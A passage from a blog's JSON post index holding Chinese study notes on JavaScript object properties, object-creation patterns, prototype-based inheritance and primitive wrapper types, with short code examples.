['red','green'];&#125;SuperType.prototype.sayName = function()&#123; console.log(this.name);&#125;function SubType(name, age)&#123; SuperType.call(this, name); // 第二次调用SuperType() this.age = age;&#125;SubType.prototype = new SuperType(); // 第一次调用SuperType()SubType.prototype.constructor = SubType; // 将SubType原型的constructor指向正确的SubTypeSubType.prototype.sayAge = function()&#123; console.log(this.age);&#125; 第一次调用SuperType()后，SubType.prototype会得到两个name和colors属性，它们都是SuperType的实例属性，现在位于SubType的原型中。当调用SubType的构造函数时，会第二次调用SuperType()，第二次会在新对象上创建实例属性name和colors，同时会屏蔽原型中的两个同名属性。如图所示，由于调用两次SuperType构造函数，所以其实有两组name和colors属性，一组在实例上，一组在SubType原型上。 所谓寄生组合式继承，即通过借用构造函数来继承属性，通过原型链来继承方法。思路为：由于仅需要父类原型的一个副本，所以不必为了指定子类型的原型而调用父类的构造函数。本质上就是通过使用寄生式继承来继承父类的原型，在将结果指定给子类的原型：12345function inheritPrototype(subType, superType)&#123; var proto = obj(superTpye.prototype); // 创建对象 proto.constructor = subType; // 增强对象 subType.prototype = proto; // 指定对象&#125; inheritPrototype函数实现了寄生式组合继承的最简单形式，此函数接收两个参数：子类构造函数和父类构造函数。在函数内部，第一步是创建父类原型的一个副本，第二步是为创建的副本添加constructor属性，从而纠正由于重写原型而失去的默认的constructor属性，最后一步将新创建的副本对象赋值给子类的原型。 如此，通过调用inheritPrototype去替换前例中为子类原型赋值的语句：123456789101112131415161718function SuperType(name)&#123; this.name = name; this.colors = ['red','green'];&#125;SuperType.prototype.sayName = function()&#123; console.log(this.name);&#125;function SubType(name, age)&#123; SuperType.call(this, name); this.age = age;&#125;inheritPrototype(SubType, SuperType); // 此处替换new SubType语句SubType.prototype.sayAge = function()&#123; console.log(this.age);&#125; 上例只调用了依次SuperType构造函数，并且因此避免了在SubType.prototype上创建不必要的、多余的属性，同时原型链还是保持不变，也能正常使用instanceof和isPrototypeOf方法。 至此，引用类型最理想的继承模式为寄生组合式继承，YUI的YAHOO.lang.extend()方法就采用了寄生组合继承。 小结ES支持OO，但不使用类或接口。对象可以在代码执行过程中创建或增强，因此具有动态性而非严格定义的实体。在没有类的情况下，可采用下列模式创建对象： 工厂模式，使用简单的函数创建对象，为对象添加属性或方法，然后返回对象，这个模式后被构造函数模式所取代 构造函数模式，可以创建自定义引用类型，可以像创建内置对象实例一样使用new操作符，但缺点是属性和方法无法得到复用。由于函数可以不局限于任何对象（与对象具有松散耦合的特点），因此没有理由不在多个对象间共享函数。 原型模式，使用构造函数的prototype属性来指定那些是应该共享的属性和方法，组合使用构造函数模式和原型模式时，使用构造函数定义实例属性，而使用原型定义共享的属性和方法。 JS主要通过原型链实现继承，原型链的构建是通过将一个类型的实例赋值给另一个构造函数的原型实现的，这样，子类就能够访问父类的所有属性和方法，这一点与基于类的继承很类似。 原型链的问题是对象实例共享所有继承的方法和属性，因此不适合单独使用，解决问题的技术是借用构造函数，即在子类构造函数内部调用父类构造函数，这样能使每个实例拥有自己的属性，同时还能保证只使用构造函数模式来定义类型，使用最多的继承模式是组合继承，这种模式使用原型链继承共享的属性好方法，而通过借用构造函数继承实例属性。此外可选的继承模式还有： 原型链继承，可以在必须预先定义构造函数的情况下实现继承，本质是执行对给定对象的浅复制，而复制得到的副本还可以进一步改进。 寄生式继承，与原型式继承非常相似，也是基于某个对象或某种信息创建一个对象，然后增强对象，最后返回对象。为了解决组合继承由于多次调用父类构造函数而导致的低效问题，可以将这个模式与组合继承一起使用。 寄生组合式继承，实现基于类型继承的最有效方式，集寄生式继承和组合继承优点于一身。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-10-面向对象1-理解对象属性","slug":"js-pro10","date":"2016-08-10T13:36:01.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2016/08/10/js-pro10/","link":"","permalink":"https://github.com/xmoyKING/2016/08/10/js-pro10/","excerpt":"","text":"面向对象（OO，Object-Oriented）语言的标志就是它们都有类的概念，通过类可以创建任意多个具有相同属性和方法的对象，而ES中没有传统的类的概念，因此它的对象也与基于类的语言中的对象不同。 ECMA-262将对象定义为：无序属性的集合，其属性可以包含基本值、对象或函数。严格来说，这就相当于将对象看作是一组没有特定顺序的值。对象的每个属性和方法都有一个名字，而每个名字都映射到一个值，因此，可以将ES中的对象当做散列表（即键值对）。 每个对象都是基于一个引用类型创建的，这个引用类型即可以是ES的原生类型，有可以是自定义的类型。 理解对象创建自定义对象的最简单方式就是创建一个Object的实例，然后再为其添加属性和方法:12345678var person = new Object();person.name = \"king\";person.age = 26;person.job = \"software engineer\";person.sayName = function()&#123; console.log(this.name);&#125; 早期js开发者经常使用上述构造函数的方式创建新对象，但目前创建这种对象的首选方法是对象字面量,效果同前，代码如下：123456789var person = &#123; name: 'king', age: 26, job: 'software engineer', sayName: function()&#123; console.log(this.name); &#125;&#125; 属性类型ES5新定义只在内部使用的特性（attribute）时，描述了属性（property）的各种特征。定义这些特性是为了实现js引擎，因此js中不能直接方法他们，为了表示特性是内部值，该规范将它们放在两队方括号中，例如：[[Enumerable]] ES中有两种属性：数据属性和访问器属性， 数据属性数据属性包含一个数据值的位置，在这个位置可以读写，数据属性有4个描述行为的特性： [[Configurable]] 表示能否通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性，不使用Object.defineProperty时默认为true，，使用后默认为false [[Enumerable]] 表示能否通过for-in循环返回属性，不使用Object.defineProperty时默认为true，，使用后默认为false [[Writable]] 表示能否修改属性的值，不使用Object.defineProperty时默认为true，，使用后默认为false [[Value]] 包含这个属性的数据值，读取属性值时，从这个位置读，写入属性值时，将新值保存至此，默认为undefined 例如var man = {name: &quot;king&quot;};创建了对象man，其有名为name的属性，为它指定的值就是&quot;king&quot;。 要想修改属性默认的特性，必须使用ES5定义的Object.defineProperty方法，接受3个参数：所属对象，属性名，描述符对象。其中描述符对象（descriptor）的属性必须是configurable、enumerable、writable、value：123456789var p =&#123;&#125;;Object.defineProperty(p, 'name', &#123; writable: false, value: 'king'&#125;);console.log(p.name); // kingp.name = 'tom'; // 修改为新的值，在严格模式下会报错，非严格模式下会忽略console.log(p.name); // 依然是king 将configurable设置为false表示不能从对象删除属性，若对这个属性调用delete则非严格模式下会忽略，严格模式下报错。若一旦将某属性设置为不可配置，则无法将其变为可配置，此时，再调用Object.defineProperty方法除了修改writable之外的属性都会报错：123456789var p =&#123;&#125;;Object.defineProperty(p, 'name', &#123; configurable: false, value: 'king'&#125;);Object.defineProperty(p, 'name', &#123; configurable: true, // 报错&#125;); 即默认是可多次调用Object.defineProperty方法修改同一个属性，一但将configurable设为false就不行了。 访问器属性访问器不包含数据值，包含一对getter和setter函数(非必须)，在读取访问器属性时，会调用getter函数，其负责返回有效值。写入访问器属性时，调用setter并传入新值，其决定如何处理数据，访问器属性有4个特性： [[Configurable]] 表示能否通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为数据属性，不使用Object.defineProperty时默认为true，，使用后默认为false [[Enumerable]] 表示能否通过for-in循环返回属性，不使用Object.defineProperty时默认为true，，使用后默认为false [[Get]] 读取属性值时调用的函数，默认为undefined [[Set]] 写入属性值时调用的函数，默认为undefined访问器属性不能直接定义，必须通过Object.defineProperty定义：12345678910111213141516171819var b = &#123; _year: 2001, edition: 1,&#125;Object.defineProperty(b, 'year', &#123; get: function()&#123; return this._year; &#125;, set: function(v)&#123; if(v &gt; 2001)&#123; this._year = v; this.edition++; &#125; &#125;&#125;);b.year = 2005;b.edition; // 2; 只指定getter意为属性不能改，写入属性会被忽略，严格模式下会报错。 ES5定义的访问器属性，用于替换非标准方法：__defineGetter__()和__defineSetter__()。 定义多个属性由于为对象定义多个属性的场景很多，ES5提供了Object.defineProperties方法，可同时对多个属性定义,前面的例子改写如下，结果相同：1234567891011121314151617181920212223var b = &#123;&#125;Object.defineProperties(b, &#123; _year: &#123; value: 2001, &#125;, edition: &#123; value: 1, &#125;, year:&#123; get: function()&#123; return this._year; &#125;, set: function(v)&#123; if(v &gt; 2001)&#123; this._year = v; this.edition++; &#125; &#125; &#125;&#125;); 读取属性的特性ES5提供了获取给定属性的描述符的方法，Object.getOwnPropertyDescriptor方法，接收两个参数：所属对象，描述符属性名，返回一个对象，包含访问器属性/数据属性。123456789101112131415161718192021222324252627282930var b = &#123;&#125;;Object.defineProperties(b, &#123; _year: &#123; value: 2001, &#125;, edition: &#123; value: 1, &#125;, year:&#123; get: function()&#123; return this._year; &#125;, set: function(v)&#123; if(v &gt; 2001)&#123; this._year = v; this.edition++; &#125; &#125; &#125;&#125;);var dp = Object.getOwnPropertyDescriptor(b, '_year');console.log(dp); // &#123;value: 2001, writable: false, enumerable: false, configurable: false&#125;dp = Object.getOwnPropertyDescriptor(b, 'year');console.log(dp); // &#123;enumerable: false, configurable: false, get: ƒ (), set: ƒ (v)&#125; 在JS中，可对任意一个对象，包括DOM和BOM对象使用getOwnPropertyDescriptor方法。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-11-面向对象2-创建对象","slug":"js-pro11","date":"2016-08-10T10:32:09.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2016/08/10/js-pro11/","link":"","permalink":"https://github.com/xmoyKING/2016/08/10/js-pro11/","excerpt":"","text":"接上篇JavaScript高级程序设计-10-面向对象1-理解对象属性 创建对象虽然Object构造函数或对象字面量都可以用来创建单个对象，但有明显的缺点：使用同一个接口创建多个对象会产生大量的重复代码，工厂模式的一个变体就可以解决这个问题。 工厂模式工厂模式是一种常见的软件设计模式，这种模式抽象了创建具体对象的过程。考虑ES无法创建类，因此使用函数代替，通过函数以特定接口来封装创建对象的细节，如下例：12345678910111213function createPerson(name, age, job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function()&#123; console.log(this.name); &#125; return o;&#125;var p1 = createPerson('king', 21, 'software engineer');var p2 = createPerson('tom', 22, 'software manager'); 通过函数createPerson能够根据接受的参数来构建一个包含所有必要信息的Person对象，可以无数次调用这个函数，且每次返回一个包含特定属性和方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别问题（即如何确定对象的类型，而用typeof仅仅只能知道都是object类型）。构造函数模式则解决了对象识别问题。 构造函数模式ES中的构造函数可用来创建特定类型的对象，像Object和Array这样的原生构造函数，在运行时会自动出现在执行环境中，此外，也可以创建自定义的构造函数，从而定义自定义对象类型的属性和方法，例如，使用构造函数模式重写例子：1234567891011function Person(name, age, job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = function()&#123; console.log(this.name); &#125;&#125;var p1 = new Person('king', 21, 'software engineer');var p1 = new Person('tom', 22, 'software manager'); 上例中，Person函数取代createPerson函数，同时，函数实现中有如下不同： 没有显式的创建object对象 直接将属性和方法赋值给了this对象 没有return语句此外，按照惯例，构造函数名的命名方式为大写首字母（大驼峰），借鉴其他OO语言，为了区别ES中的其他函数，因为构造函数本身也是一个函数，只不过这个函数专门用来创建对象。 要创建Person的实例，必须使用new操作符，实际背后的执行流程如下： 创建一个新对象 将构造函数的作用域赋给新对象（因此this就指向了这个新对象） 执行构造函数中的代码（为这个新对象添加属性） 返回新对象 本例中，p1和p2分别保存这个一个Person的实例，这两个对象都有一个constructor（构造函数）属性，该属性指向Person：12p1.constructor == Person; // truep2.constructor == Person; // true 对象的constructor属性最初是用来表示对象类型的，但检测对象类型，还是用instanceof操作符更可靠一些：12345p1 instanceof Person; // truep2 instanceof Person; // truep1 instanceof Object; // truep2 instanceof Object; // true 创建自定义的构造函数意味着可以用它的实例标识为一种特定的类型，而这正是构造函数模式胜过工厂模式的地方。 同时需要注意的是以本例这种方式定义的构造函数是定义在Global对象中的（浏览器下为window对象） 将构造函数当做函数构造函数与其他函数唯一区别就在于调用方式不同。但构造函数毕竟时函数，不存在定义构造函数的特殊语法。任何函数只要通过new操作符调用，那么它就作为构造函数。而任何函数不通过new操作符调用则与普通函数无区别,上例的Person构造函数不通过new操作符调用也可以：12345678// 当做普通函数使用Person('king', 21, 'software engineer'); // 对象会被添加到window中window.sayName(); // 'king'// 在另一个作用域中调用var o = new Object();Person.call(o, 'king', 21, 'software engineer');o.sayName(); // 'king' 本例中，当不使用new操作符调用Person时，属性和方法都被添加到window对象中，因为当在全局作用域中调用一个函数时，this对象总是指向Global对象，因此在调用完函数后，可以通过window对象来调用sayName方法。 最后，通过call在某特殊对象的作用域中调用Person函数，本例是在o对象的作用域中调用的，因此o就拥有了属性和方法。 构造函数的问题构造函数模式虽然好用，但也有缺点。主要问题是每个方法都需要在每个实例上重新创建一遍，在前面的例子中，p1和p2都有一个名为sayName的方法，但两个方法却不是同一个Function的实例（在ES中函数也是对象，因此每个函数被定义也就是实例化了一个Function对象），所以从逻辑上此时的构造函数应该这样定义：123456function Person(name, age, job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = new Function(\"console.log(this.name);\"); // 与声明函数在逻辑上等价&#125; 从本例更容易理解每个Person实例都包含一个不同的Function实例的本质，即，以这种方式创建函数，会导致不同作用域和标识符解析，但创建Function新实例的机制仍然是相同的，因此，不同实例上的同名函数是不相等的：1p1.sayName == p2.sayName; // false 理论上，确实没有必要创建多个同样功能的Function实例，况且有this对象在，根本不用在执行代码前就把函数绑定到特定对象上，因此，可考虑将函数定义转移到构造函数外部：123456789function Person(name, age, job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = sayName;&#125;function sayName()&#123; console.log(this.name);&#125; 这样，相当于在构造函数内部将sayName属性设置为全局的sayName函数。由于sayNaem包含的时一个指向函数的指针，因此p1和p2对象就共享了在全局作用域中定义的同一个sayName函数，这就解决了两个函数功能相同的问题。 但新问题又有了，在全局作用域定义的函数实际上却只能被某个对象调用，这样全局作用域有点不对。同时，若对象需要定义很多方法那么就必须同时定义多个全局函数了，这样会极大破坏封装。 以上的问题通过原型模式可解决。 原型模式每一次创建的函数都有一个prototype（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是：包含可以由可定类型的所有实例共享的属性和方法。即不必在构造函数中定义对象实例的信息，而将这些信息直接添加到原型对象中：1234567891011121314function Person()&#123;&#125;;Person.prototype.name = \"king\";Person.prototype.age = 22;Person.prototype.job = \"software engineer\";Person.prototype.sayName = function()&#123; console.log(this.name);&#125;;var p1 = new Person();p1.sayName(); // 'king'var p2 = new Person();p1.sayName == p2.sayName; // true 上例将方法和属性都直接添加到Person的原型中，构造函数变为空函数。由于原型中所有的属性和方法由所有实例共享，因此p1和p2访问的都是同一组属性和方法。 要理解原型模式的工作原理，需要理解ES中原型对象的性质： 理解原型对象无论何时，只要创建了一个新函数，就会根据一组特定的规则为该函数创建一个prototype属性，这个属性指向函数的原型对象，在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就前例来说：Person.prototype.constructor指向Person，而通过这个构造函数，还可以继续为原型对象添加其他属性和方法。 创建了自定义的构造函数后，其原型对象默认只会取得constructor属性，至于其他方法，则都是从Object继承而来，当调用构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型对象。在ES5中，这个指针被称为[[prototype]]，但由于以前没有规定标准的访问[[prototype]]的方法，所以浏览器在所有实例上实现了一个__proto__属性用于访问[[prototype]]。 需要明确：真正重要的时这个连接存在与实例与构造函数的原型对象之间，而不是存在与实例与构造函数之间。上图展示了Person构造函数、Person的原型属性、以及Person的实例之间的关系：Person.prototype指向了原型对象，而Person.prototype.constructor又指回了Person。原型对象中除了包含constructor属性之外，还包含后来添加的其他属性。Person的每个实例p1和p2都包含一个内部属性，该属性仅仅指向Person。prototype，即，它们与构造函数没有直接的关系，此外，需要注意，虽然这两个实例都不包含属性和方法，但却可以通过实例来调用sayName方法，实现原理与查找对象属性的过程相同。 虽然没有标准的访问[[prototype]]的方法，但可通过isPrototypeOf方法来确定对象之间是否存在这种关系，从本质讲，若[[prototype]]指向调用isPrototypeOf方法的对象（Person.prototype），那么返回true：1Person.prototype.isPrototypeOf(p1); // true 其实，ES5添加了一个新方法，叫Object.getPrototypeOf，这个方法会返回[[prototype]]的值:12Object.getPrototypeOf(p1) == Person.prototype; // trueObject.getPrototypeOf(p1).name; // 'king' 每当代码读取某个对象的某个属性时，都会执行一次搜索，目标时具有给定名字的属性，搜索先从对象实例本身开始，然后依次搜索指针指向的原型对象。 当在实例中添加属性时，会在实例中创建该属性并屏蔽原型对象中的同名属性，但不会修改原型中的同名属性，通过delete操作符删除实例属性，则能够重新访问原型的同名属性。 通过hasOwnProperty方法能检测一个属性是否存在实例中，因为这个方法只在给定属性存在于对象实例中时才会返回true。 ES5中的Object.getOwnPropertyDescriptor方法只能用于实例属性，若要取得原型属性的描述符，则必须在原型对象上调用该方法。 原型与in操作符有两种使用in操作符的方法：单独使用或在for-in循环中使用。 单独使用时，in操作符只会在通过对象能够访问给定属性时返回true，无论该属性存在实例还是原型中：12var p1 = new Person();\"name\" in p1; // true 与hasOwnProperty方法搭配则可以确定属性到底时存在实例中还是存在原型中。123function hasPrototypeProperty(obj, name)&#123; return !obj.hasOwnProperty(name) &amp;&amp; (name in obj);&#125; 在使用for-in循环时，返回的时所有能够通过对象访问的、可枚举的（enumberable）属性，即包含实例中的，也包含原型中的。默认所有自定义的属性都是可枚举的。 ES5的Object.keys方法接收一个对象作为参数，返回一个包含所有可枚举的实例属性的字符串数组。 若想要得到所有的实例属性，无论是否可枚举，可以使用Object.getOwnPropertyNames方法。 更简单的原型语法当需要定义多个方法和属性时，通常是用一个包含所有属性和方法的对象字面量来重写整个原型对象，这样能减少Person.prototype的使用：1234567891011function Person()&#123;&#125;;Person.prototype = &#123; name: \"king\", age: 22, job: \"software engineer\", sayName: function()&#123; console.log(this.name); &#125;&#125; 但这样做会导致constructor属性不再指向Person，而是指向了Object构造函数，因为用一个新的对象字面量覆盖了默认的对象原型（但instanceof操作符依然能正确使用），所以若constructor比较重要时，需要显式的将其重设：12345678910111213141516171819var p1 = new Person();p1 instanceof Object; // truep1 instanceof Person; // truep1.constructor == Object; // truep1.constructor == Person; // falsePerson.prototype = &#123; constructor: Person, name: \"king\", age: 22, job: \"software engineer\", sayName: function()&#123; console.log(this.name); &#125;&#125;var p2 = new Person();p2.constructor == Person; // true 而显示设置constructor会导致其[[Enumerable]]特性被设置为true，默认情况下，原生的contructor属性时不可枚举的，因此最好通过Object.defineProperty方法显式设置constructor属性：1234Object.defineProperty(Person.prototype, 'constructor',&#123; enumerable: false, value: Person&#125;); 原型的动态性由于原型查找的过程其实是不断回溯搜索的过程，因此对原型对象的任何修改都将立即从实例上反映出来，即使先创建了实例后修改原型也是如此。12345678910111213141516171819202122function Person()&#123;&#125;Person.prototype = &#123; constructor: Person, name: \"king\", age: 22, job: \"software engineer\", sayName: function()&#123; console.log(this.name); &#125;&#125;var p1 = new Person();p1.sayName(); // 'king'Person.prototype.sayHi = function()&#123; console.log('Hi');&#125;p1.sayHi(); // 'Hi' 原因可归结为实例与原型之间的松散链接关系，实例与原型之间的连接是一个指针而不是一个副本，因此可以通过原型获取到最新的方法或属性。 但需要注意的是，若重写了整个原型对象，则会导致访问错误并报错，因为调用构造函数时会为实例添加一个指向最初原型的[[Prototype]]指针，而将原型修改为另一个对象就等于切断了构造函数与最初原型之间的联系（实例中的指针仅指向原型，而不是指向构造函数）：12345678910111213141516function Person()&#123;&#125;var p1 = new Person();Person.prototype = &#123; constructor: Person, name: \"king\", age: 22, job: \"software engineer\", sayName: function()&#123; console.log(this.name); &#125;&#125;p1.sayName(); // Uncaught SyntaxError: Invalid shorthand property initializer 原生对象的原型原型模式的重要性不仅体现在创建自定义类型方面，就连所有原生的引用类型，都是采用这种模式创建的。所有原生引用类型（Object、Array、String等）在都其构造函数的原型上定义了方法，例如，通过Array.prototype可以找到sort方法。1typeof Array.prototype.sort; // 'function' 通过原生对象的原型、不仅可以取得所有默认方法的引用，而且可以定义新方法，就像修改自定义对象的原型一样修改原生对象的原型，因此可以随时添加或修改方法。 但不推荐在产品化程序中修改原生类型对象的原型，因为不仅会非常依赖实现（添加的特定方法可能在某些作用域或实现中没有）并且可能意外修改原生方法。 原型对象的问题原型模式也不是没有缺点，首先省略了为构造函数传递初始化参数的环节，导致所有实例在默认情况下都将获得相同的属性值。 其次，由于其共享的本质，原型中所有属性被所有实例贡献，这种共享对函数是非常适合的，对包含基本值的属性也没问题（可覆盖原型中的同名属性），但对引用类型值则有时会出大问题（修改一个会影响到所有实例）：12345678910111213141516171819202122function Person()&#123;&#125;Person.prototype = &#123; constructor: Person, name: \"king\", age: 22, job: \"software engineer\", links: ['tom', 'jim', 'shally'], sayName: function()&#123; console.log(this.name); &#125;&#125;var p1 = new Person();var p2 = new Person();p1.links.push('mix');p1.links; // ['tom', 'jim', 'shally', 'mix']p2.links; // ['tom', 'jim', 'shally', 'mix']p1.links == p2.links; // true 上例中，理论上每个person实例应该拥有属于自己的人际关系，但由于引用类型的共享问题，导致所有实例都共享一个links数组。 所以若不确定是否需要对所有实例都开放共享同一个引用类型时，不要使用这样的原型模式。 组合使用构造函数模式和原型模式创建自定义类型的最常见方式就是组合使用构造函数模式和原型模式，集两种模式的优点于一身,也是目前定义引用类型的一种默认模式。 构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性，这样一来，每个实例会有自己的一份实例属性的副本、但同时也能贡献对方法的引用，最大限度节约内存。同时，这样的混合模式还支持向构造函数传递参数。 重写前面的例子：123456789101112131415161718function Person(name, age, job)&#123; this.name = name; this.age = age; this.job = job; this.links = ['tom', 'jim', 'shally'];&#125;Person.prototype = &#123; constructor: Person, sayName: function()&#123; console.log(this.name); &#125;&#125;var p1 = new Person('king', 21, 'software engineer');var p2 = new Person('bom', 22, 'software manager'); 动态原型模式动态原型模式用于解决构造函数和原型彼此独立的问题，其他OO语言不是彼此独立的，而是将所有信息封装在构造函数中，且通过构造函数中初始化原型，保持了同时使用构造函数和原型优点，即，通过检查某个应存在的方式是否有效来决定是否需要初始化原型：12345678910111213141516function Person(name, age, job)&#123; // 属性 this.name = name; this.age = age; this.job = job; // 方法 if(typeof this.sayName != 'function')&#123; Person.prototype.sayName = function()&#123; console.log(this.name); &#125;; &#125;&#125;var p1 = new Person('king', 21, 'software engineer');p1.sayName(); 注意上述的if判断语句，只有在sayName不存在时，才会将它添加到原型中。这段代码只会在初次调用构造函数时执行，然后，原型已经初始完成，不需要在做什么修改了。 但由于原型修改会立即反映到所有实例上，所以这样的方式可以说非常完美。 尤其是不需要if检测每个属性和方法，只用检测一个就好了，也可以通过instanceof操作符来确定它的类型。 寄生构造函数模式若前面几种模式都不适用时，可使用寄生（parasitic）构造函数模式，这种模式的基本思想是：创建一个函数，该函数的作用仅仅时封装创建对象的代码，然后在返回新创建的对象，从表面上看，与典型的工厂模式非常相似。12345678910111213function Person(name, age, job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function()&#123; console.log(this.name); &#125; return o;&#125;var p1 = new Person('king', 21, 'software engineer');p1.sayName(); // 'king' 本例中，除了使用new操作符把所使用的包装函数当做构造函数使用之外，这个模式和工厂模式一模一样。Person函数创建了一个新对象，并以相应的属性和方法初始化该对象，最后返回这个对象。 其实，构造函数（必须是使用new操作符的才能称为构造函数）在不返回值的情况下，默认会返回新对象的实例，而通过在构造函数的末尾添加一个return语句，可以重写调用构造函数时返回的值。 这种模式特点就是，在特殊情况下为对象创建构造函数。假设需要创建一个具有额外方法的特殊数组，但由于不能直接修改Array构造函数，此时就非常适合了：1234567891011function SpecialArray()&#123; var a = new Array(); // 创建数组实例 a.push.apply(a, arguments); // 添加值 a.toPipedSting = function()&#123; // 添加方法 return this.join('|'); &#125; return a;&#125;var color = new SpeicalArray('red','blue','green');color.toPipedSting(); // 'red|blue|green' 关于这个模式，需要注意，首先，返回的对象与构造函数或与构造函数的原型属性之间没有关系，即，构造函数返回的对象与构造函数外部创建的对象没有什么不同，因此，不能依赖instanceof操作符来确定对象类型，所以，不到万不得已尽量不要使用这种模式。 稳妥构造函数模式稳妥对象（durable objects）是由Douglas Crockford提出的概念，指的时没有公共的属性，且其方法不引用this对象。这种对象最适合在对安全有特定要求的环境下（即禁用this和new）使用，或防止数据被其他应用修改时使用。 稳妥构造函数模式与寄生构造函数模式类似，但不同的是，即不使用this也不使用new：123456789function Person(name, age, job)&#123; var o = new Object(); o.sayName = function()&#123; console.log(name); &#125; return o;&#125;var p1 = Person('king', 21, 'software engineer');p1.sayName(); // 'king' 这种情况下，创建的对象除了使用sayName之外，没有任何方法可以访问name值，即使其他代码能给这个对象添加方法或属性，也不能访问传入到构造函数中的原始数据。这种安全性使得其非常适合用于某些安全执行环境。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-9-引用类型3-包装类型/内置单例对象","slug":"js-pro9","date":"2016-08-08T12:37:19.000Z","updated":"2017-12-06T14:50:09.368Z","comments":true,"path":"2016/08/08/js-pro9/","link":"","permalink":"https://github.com/xmoyKING/2016/08/08/js-pro9/","excerpt":"","text":"接上篇JavaScript高级程序设计-8-引用类型2-RegExp/Function 基本包装类型为了方便操作基本类型值，ES提供了3个特殊的引用类型，Boolean、Number、String，这些类型与其他引用类型相似，但同时具有与各自基本类型相应的特殊行为。实际上，每当读取一个基本类型值的时候，后台就好创建一个对应的基本包装类型对象，从而能够调用一些方法来操作这些数据。比如substring方法:12var s1 = \"some text\";var s2 = s1.substring(2); 上例中s1变量包含一个字符串（字符串是基本类型值），然后调用s1的substring方法，并将结果返回到s2中。 理论上来说，基本类型值不是对象，不应该拥有属性和方法。但实际上，为了实现这种直观的操作，后台自动完成了一系列处理，当执行到s1.substring时，访问过程处于一种读取模式，也就是要从内存中读取这个字符串的值，而在读取模式中访问字符串时，后台将自动完成如下过程： 创建String类型的一个实例 在实例上调用指定的方法 销毁这个实例上述3个过程用代码则是：123var s1 = new String(\"some text\");var s2 = s1.substring(2);s1 = null; 经过这样的3步处理，基本类型值（不仅仅是String，也包括Boolean、Number类型）就变得跟对象一样了。 引用类型和基本保证类型的主要区别是对象的生存期，使用new操作符创建的引用类型的实例，在执行流离开当前作用域之前都一直保存在内存中，而自动创建的基本包装类型的对象，则值存在于一行代码的执行瞬间，然后立即被销毁，这意味着不能在运行时为基本类型值添加属性和方法，如下例：123var s1 = \"some text\";s1.color = \"red\";console.log(s1.color); // undefined 在上述s1.color = &quot;red&quot;;代码中试图为字符串s1添加一个color属性，但当再次访问s1时，其color属性却不存在。原因就是s1.color = &quot;red&quot;;创建的String对象在执行console.log(s1.color);已经被销毁，而此时执行的console.log(s1.color);又创建了本行的String对象，而该对象并没有color属性。 当前，显示的调用Boolean、Numner、String来创建基本包装类型的对象，但一般不用显示调用，因为这种显示调用容易混淆是在处理基本类型还是引用类型的值，对基本包装类型的实例调用typeof会返回&quot;object&quot;,而所有基本保证类型的对象都会被转换为布尔值true。 Object构造函数像一个工厂方法一样，能根据传入值的类型返回相应基本保证类型的实例，如：12var obj = new Object(\"some text\");console.log(obj instanceof String); // true 把字符串传给Object构造函数、就会创建String的实例，而传入数值参数会得到Number的实例，传入布尔值参数会得到Boolean的实例。 同时需要注意的是，使用new调用基本保证类型的构造函数、与直接调用同名的转型函数是不一样的，如：123456var value = \"25\";var number = Number(value); // 转型函数console.log(typeof number); // \"number\"var obj = new Number(value); // 构造函数console.log(typeof obj); // \"object\" 上例中变量number中保存的是基本类型值25，而变量obj中保存的是Number的实例。 尽管不建议直接显式穿件基本保证类型的对象，但它们操作基本类型值的能力非常重要，而每个基本保证类型都提供了操作相应值的便捷方法。 Boolean类型Boolean类型是与布尔值对应的引用类型，要创建Boolean对象，可以调用Boolean构造函数并传入false/true值:1var boolObj = new Boolean(true); Boolean类型的实例重写了valueOf方法，返回基本类型值true和false，重写了toString方法，返回字符串”true”和”false”。 但ES中Boolean对象用的不多，因为容易混淆，常见问题就是布尔表达式中使用Boolean对象：1234567var falseObj = new Boolean(false);var result = falseObj &amp;&amp; true;console.log(result); // truevar falseVal = false;result = falseVal &amp;&amp; true;console.log(result); // false 上例中使用false值穿件了一个Boolean对象，然后将这个对象与基本类型值true构成逻辑与表达式，在布尔运算中，false &amp;&amp; true等于false，但实例中的falseObj是一个对象（它的值为false），布尔表达式中任意对象都会被转换为true，因此，结果是true。 基本类型和引用类型的布尔值还有两个区别： typeof操作符对基本类型返回”boolean”, 而对引用类型返回”object” 由于Boolean对象是Boolean类型的实例，所以使用instanceof操作符测试Boolean对象会返回true，而测试基本类型的布尔值会返回false1234console.log(typeof falseObj); // objectconsole.log(typeof falseVal); // booleanconsole.log(falseObj instanceof Boolean); // trueconsole.log(falseVal instanceof Boolean); // false 理解基本类型的布尔值与Boolean对象之间的区别非常重要，建议是永不显式使用Boolean对象。 Number类型Number类型是与数字值对应的引用类型，与Boolean类型一样，Number类型也重写了valueOf、toString等方法。 除了继承的方法，Number类型还提供了一些用于将数值格式化为字符串的方法，其中toFixed方法会按照指定的小数位返回数值的字符串表示：123456var num = 10;console.log(num.toFixed(2)); // \"10.00\"var num = 10.005;console.log(num.toFixed(2)); // 